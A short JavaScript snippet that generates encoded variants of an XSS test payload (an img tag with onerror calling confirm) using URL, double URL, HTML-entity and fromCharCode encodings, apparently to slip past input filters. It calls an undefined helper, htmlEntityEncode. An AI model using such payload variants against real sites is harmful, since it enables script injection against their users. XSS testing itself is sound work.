const payload = '<img src="x" onerror=confirm("XSS")>';

// URL-encode the payload
const encodedPayload = encodeURIComponent(payload);
console.log("Encoded: " + encodedPayload);

// Double URL-encode the already encoded payload
const doubleEncoded = encodeURIComponent(encodedPayload);
console.log("Double Encoded: " + doubleEncoded);


// HTML entity encode the payload
const htmlencodedContent = htmlEntityEncode(payload);
console.log("HTMLEncoded: " + htmlencodedContent);

// Generate and encode payload using String.fromCharCode()
const payloadFromCharCode = String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 120, 34, 32, 111, 110, 101, 114, 114, 111, 114, 61, 99, 111, 110, 102, 105, 114, 109, 40, 34, 88, 83, 83, 34, 41, 62);
const asciiEncodedPayload = encodeURIComponent(payloadFromCharCode);
console.log("ASCII Encoded: " + asciiEncodedPayload);
